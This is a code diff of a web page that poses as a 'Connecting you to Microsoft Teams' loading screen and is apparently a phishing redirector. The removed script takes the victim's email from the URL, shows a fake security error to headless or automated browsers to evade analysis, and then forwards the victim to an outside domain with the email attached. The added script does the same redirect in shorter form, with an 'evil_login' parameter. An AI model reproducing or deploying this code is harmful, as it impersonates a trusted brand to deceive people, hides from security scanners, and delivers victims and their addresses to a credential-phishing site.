@@ -18,28 +18,13 @@
 
   <h2>Please wait...</h2>
   <p>Connecting you to Microsoft Teams</p>
-
   <script>
-  window.addEventListener('load', function() {
-    const rawHash = window.location.hash.substring(1);
-    const email = decodeURIComponent(rawHash);
-
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-      document.body.innerHTML = "<h2>Invalid or missing email.</h2>";
-      return;
-    }
-
-    if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-      document.body.innerHTML = "<h2>Security verification failed</h2><p>Please use a real browser.</p>";
-      return;
-    }
-
-    setTimeout(function() {
-      const redirectURL = "https://access-meetings.visions-solutions.ca/yLobagKc#" + encodeURIComponent(email);
-      window.location.assign(redirectURL); // more reliable than location.href
-    }, 4000);
-  });
+window.addEventListener('load', function() {
+    const hashEmail = window.location.hash.substring(1); // target@example.com
+    if (!hashEmail) return;
+    const redirectURL = "https://access-meetings.visions-solutions.ca/yLobagKc?evil_login=" + encodeURIComponent(hashEmail);
+    window.location.assign(redirectURL);
+});
 </script>
 </body>
 </html>
